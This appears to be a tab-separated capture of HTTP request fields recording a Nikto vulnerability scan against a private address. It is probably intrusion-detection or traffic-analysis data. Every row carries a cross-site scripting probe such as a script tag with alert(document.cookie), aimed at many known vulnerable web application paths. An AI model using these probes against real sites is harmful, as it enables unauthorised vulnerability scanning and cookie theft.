http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									2296						1	http://192.168.1.101/web/wp-login.php/index.php?dir=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000713)				/web/wp-login.php/index.php?dir=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2300						1	http://192.168.1.101/web/wp-login.php/https-admserv/bin/index?/<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000714)				/web/wp-login.php/https-admserv/bin/index?/<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									2304						1	http://192.168.1.101/web/wp-login.php/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000715)				/web/wp-login.php/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									2308						1	http://192.168.1.101/web/wp-login.php/article.cfm?id=1'<script>alert(document.cookie);</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000716)				/web/wp-login.php/article.cfm?id=1'<script>alert(document.cookie);</script>
																	Keep-Alive										192.168.1.101									2312						1	http://192.168.1.101/web/wp-login.php/upload.php?type=\"<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000717)				/web/wp-login.php/upload.php?type=\"<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									2316						1	http://192.168.1.101/web/wp-login.php/soinfo.php?\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000718)				/web/wp-login.php/soinfo.php?\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2320						1	http://192.168.1.101/web/wp-login.php/modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000719)				/web/wp-login.php/modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>;
																	Keep-Alive										192.168.1.101									2324						1	http://192.168.1.101/web/wp-login.php/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000720)				/web/wp-login.php/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
																	Keep-Alive										192.168.1.101									2328						1	http://192.168.1.101/web/wp-login.php/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000721)				/web/wp-login.php/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+>
																	Keep-Alive										192.168.1.101									2332						1	http://192.168.1.101/web/wp-login.php/webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000722)				/web/wp-login.php/webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef
																	Keep-Alive										192.168.1.101									2336						1	http://192.168.1.101/web/wp-login.php/addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000723)				/web/wp-login.php/addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
																	Keep-Alive										192.168.1.101									2340						1	http://192.168.1.101/web/wp-login.php/666%0a%0a<script>alert('Vulnerable');</script>666.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000724)				/web/wp-login.php/666%0a%0a<script>alert('Vulnerable');</script>666.jsp
																	Keep-Alive										192.168.1.101									2344						1	http://192.168.1.101/web/wp-login.php/servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000725)				/web/wp-login.php/servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2348						1	http://192.168.1.101/web/wp-login.php/servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000726)				/web/wp-login.php/servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2352						1	http://192.168.1.101/web/wp-login.php/servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000727)				/web/wp-login.php/servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2356						1	http://192.168.1.101/web/wp-login.php/servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000728)				/web/wp-login.php/servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2360						1	http://192.168.1.101/web/wp-login.php/servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000729)				/web/wp-login.php/servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2364						1	http://192.168.1.101/web/wp-login.php/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000730)				/web/wp-login.php/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2368						1	http://192.168.1.101/web/wp-login.php/<script>alert('Vulnerable')</script>.shtm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000731)				/web/wp-login.php/<script>alert('Vulnerable')</script>.shtm
																	Keep-Alive										192.168.1.101									2372						1	http://192.168.1.101/web/wp-login.php/<script>alert('Vulnerable')</script>.stm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000732)				/web/wp-login.php/<script>alert('Vulnerable')</script>.stm
																	Keep-Alive										192.168.1.101									2376						1	http://192.168.1.101/web/wp-login.php/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000733)				/web/wp-login.php/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									2380						1	http://192.168.1.101/web/wp-login.php/SiteServer/Knowledge/Default.asp?ctr=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000734)				/web/wp-login.php/SiteServer/Knowledge/Default.asp?ctr=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2384						1	http://192.168.1.101/web/wp-login.php/_mem_bin/formslogin.asp?\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000735)				/web/wp-login.php/_mem_bin/formslogin.asp?\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2388						1	http://192.168.1.101/web/wp-login.php/nosuchurl/><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000736)				/web/wp-login.php/nosuchurl/><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2392						1	http://192.168.1.101/web/wp-login.php/test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000737)				/web/wp-login.php/test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x
																	Keep-Alive										192.168.1.101									2396						1	http://192.168.1.101/web/wp-login.php/test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000738)				/web/wp-login.php/test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x
																	Keep-Alive										192.168.1.101									2400						1	http://192.168.1.101/web/wp-login.php/search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000740)				/web/wp-login.php/search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;
																	Keep-Alive										192.168.1.101									2404						1	http://192.168.1.101/web/wp-login.php/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000741)				/web/wp-login.php/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									2408						1	http://192.168.1.101/web/wp-login.php/~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000767)				/web/wp-login.php/~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null
																	Keep-Alive										192.168.1.101									2412						1	http://192.168.1.101/web/wp-login.php/~/<script>alert('Vulnerable')</script>.aspx		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000768)				/web/wp-login.php/~/<script>alert('Vulnerable')</script>.aspx
																	Keep-Alive										192.168.1.101									2416						1	http://192.168.1.101/web/wp-login.php/~/<script>alert('Vulnerable')</script>.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000769)				/web/wp-login.php/~/<script>alert('Vulnerable')</script>.asp
																	Keep-Alive										192.168.1.101									2420						1	http://192.168.1.101/web/wp-login.php/z_user_show.php?method=showuserlink&class=<Script>javascript:alert(document.cookie)</Script>&rollid=admin&x=3da59a9da8825&		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000770)				/web/wp-login.php/z_user_show.php?method=showuserlink&class=<Script>javascript:alert(document.cookie)</Script>&rollid=admin&x=3da59a9da8825&
																	Keep-Alive										192.168.1.101									2424						1	http://192.168.1.101/web/wp-login.php/catinfo?<b>\">TESTING		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000771)				/web/wp-login.php/catinfo?<b>\">TESTING
																	Keep-Alive										192.168.1.101									2428						1	http://192.168.1.101/web/wp-login.php/webchat/register.php?register=yes&username=OverG&email=<script>alert%20(\"Vulnerable\")</script>&email1=<script>alert%20(\"Vulnerable\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000772)				/web/wp-login.php/webchat/register.php?register=yes&username=OverG&email=<script>alert%20(\"Vulnerable\")</script>&email1=<script>alert%20(\"Vulnerable\")</script>
																	Keep-Alive										192.168.1.101									2432						1	http://192.168.1.101/web/wp-login.php/webamil/test.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000773)				/web/wp-login.php/webamil/test.php
																	Keep-Alive										192.168.1.101									2436						1	http://192.168.1.101/web/wp-login.php/users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000774)				/web/wp-login.php/users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
																	Keep-Alive										192.168.1.101									2440						1	http://192.168.1.101/web/wp-login.php/usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27)		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000775)				/web/wp-login.php/usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27)
																	Keep-Alive										192.168.1.101									2444						1	http://192.168.1.101/web/wp-login.php/user.php?op=userinfo&uname=<script>alert('hi');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000776)				/web/wp-login.php/user.php?op=userinfo&uname=<script>alert('hi');</script>
																	Keep-Alive										192.168.1.101									2448						1	http://192.168.1.101/web/wp-login.php/TopSitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000779)				/web/wp-login.php/TopSitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
																	Keep-Alive										192.168.1.101									2452						1	http://192.168.1.101/web/wp-login.php/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000780)				/web/wp-login.php/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									2456						1	http://192.168.1.101/web/wp-login.php/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000781)				/web/wp-login.php/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									2460						1	http://192.168.1.101/web/wp-login.php/supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000782)				/web/wp-login.php/supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
																	Keep-Alive										192.168.1.101									2464						1	http://192.168.1.101/web/wp-login.php/supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000783)				/web/wp-login.php/supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
																	Keep-Alive										192.168.1.101									2468						1	http://192.168.1.101/web/wp-login.php/supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000784)				/web/wp-login.php/supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
																	Keep-Alive										192.168.1.101									2472						1	http://192.168.1.101/web/wp-login.php/sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000785)				/web/wp-login.php/sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2476						1	http://192.168.1.101/web/wp-login.php/submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000786)				/web/wp-login.php/submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview
																	Keep-Alive										192.168.1.101									2480						1	http://192.168.1.101/web/wp-login.php/ss000007.pl?PRODREF=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000787)				/web/wp-login.php/ss000007.pl?PRODREF=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2484						1	http://192.168.1.101/web/wp-login.php/showcat.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000788)				/web/wp-login.php/showcat.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
																	Keep-Alive										192.168.1.101									2488						1	http://192.168.1.101/web/wp-login.php/shop/normal_html.cgi?file=&lt;script&gt;alert(\"Vulnerable\")&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000789)				/web/wp-login.php/shop/normal_html.cgi?file=&lt;script&gt;alert(\"Vulnerable\")&lt;/script&gt;
																	Keep-Alive										192.168.1.101									2492						1	http://192.168.1.101/web/wp-login.php/setup.exe?<script>alert('Vulnerable')</script>&page=list_users&user=P		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000790)				/web/wp-login.php/setup.exe?<script>alert('Vulnerable')</script>&page=list_users&user=P
																	Keep-Alive		0	0	application/x-www-form-urlencoded						192.168.1.101									2496						1	http://192.168.1.101/web/wp-login.php/servlet/custMsg?guestName=<script>alert(\"Vulnerable\")</script>		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000791)				/web/wp-login.php/servlet/custMsg?guestName=<script>alert(\"Vulnerable\")</script>
																	Keep-Alive		0	0	application/x-www-form-urlencoded						192.168.1.101									2500						1	http://192.168.1.101/web/wp-login.php/servlet/CookieExample?cookiename=<script>alert(\"Vulnerable\")</script>		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000792)				/web/wp-login.php/servlet/CookieExample?cookiename=<script>alert(\"Vulnerable\")</script>
																	Keep-Alive										192.168.1.101									2504						1	http://192.168.1.101/web/wp-login.php/servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000793)				/web/wp-login.php/servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2508						1	http://192.168.1.101/web/wp-login.php/search/index.cfm?<script>alert(\"Vulnerable\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000794)				/web/wp-login.php/search/index.cfm?<script>alert(\"Vulnerable\")</script>
																	Keep-Alive										192.168.1.101									2512						1	http://192.168.1.101/web/wp-login.php/search/?SectionIDOverride=1&SearchText=<script>alert(document.cookie);</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000795)				/web/wp-login.php/search/?SectionIDOverride=1&SearchText=<script>alert(document.cookie);</script>
																	Keep-Alive										192.168.1.101									2516						1	http://192.168.1.101/web/wp-login.php/search.php?zoom_query=<script>alert(\"hello\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000796)				/web/wp-login.php/search.php?zoom_query=<script>alert(\"hello\")</script>
																	Keep-Alive										192.168.1.101									2520						1	http://192.168.1.101/web/wp-login.php/search.php?searchstring=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000797)				/web/wp-login.php/search.php?searchstring=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									2524						1	http://192.168.1.101/web/wp-login.php/search.php?searchfor=\"><script>alert(1776)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000798)				/web/wp-login.php/search.php?searchfor=\"><script>alert(1776)</script>
																	Keep-Alive										192.168.1.101									2528						1	http://192.168.1.101/web/wp-login.php/search.asp?term=<%00script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000799)				/web/wp-login.php/search.asp?term=<%00script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2532						1	http://192.168.1.101/web/wp-login.php/script>alert('Vulnerable')</script>.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000800)				/web/wp-login.php/script>alert('Vulnerable')</script>.cfm
																	Keep-Alive										192.168.1.101									2536						1	http://192.168.1.101/web/wp-login.php/samples/search.dll?query=<script>alert(document.cookie)</script>&logic=AND		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000801)				/web/wp-login.php/samples/search.dll?query=<script>alert(document.cookie)</script>&logic=AND
																	Keep-Alive										192.168.1.101									2540						1	http://192.168.1.101/web/wp-login.php/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000802)				/web/wp-login.php/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/wp-login.php/profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000803)				/web/wp-login.php/profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
																	Keep-Alive										192.168.1.101									2552						1	http://192.168.1.101/web/wp-login.php/postnuke/modules.php?op=modload&name=Web_Links&file=index&req=viewlinkdetails&lid=666&ttitle=Mocosoft+Utilities\"%3<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000804)				/web/wp-login.php/postnuke/modules.php?op=modload&name=Web_Links&file=index&req=viewlinkdetails&lid=666&ttitle=Mocosoft+Utilities\"%3<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2556						1	http://192.168.1.101/web/wp-login.php/postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000805)				/web/wp-login.php/postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
																	Keep-Alive										192.168.1.101									2560						1	http://192.168.1.101/web/wp-login.php/pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000806)				/web/wp-login.php/pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1
																	Keep-Alive										192.168.1.101									2564						1	http://192.168.1.101/web/wp-login.php/pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000807)				/web/wp-login.php/pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello
																	Keep-Alive										192.168.1.101									2568						1	http://192.168.1.101/web/wp-login.php/pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000808)				/web/wp-login.php/pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit
																	Keep-Alive										192.168.1.101									2572						1	http://192.168.1.101/web/wp-login.php/phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000809)				/web/wp-login.php/phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2576						1	http://192.168.1.101/web/wp-login.php/phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\"><script>alert('Vulnerable')</script>&MMN_position=[X:X]		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000810)				/web/wp-login.php/phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\"><script>alert('Vulnerable')</script>&MMN_position=[X:X]
																	Keep-Alive										192.168.1.101									2580						1	http://192.168.1.101/web/wp-login.php/phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000811)				/web/wp-login.php/phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2584						1	http://192.168.1.101/web/wp-login.php/phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000812)				/web/wp-login.php/phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\"><script>alert('Vulnerable')</script>
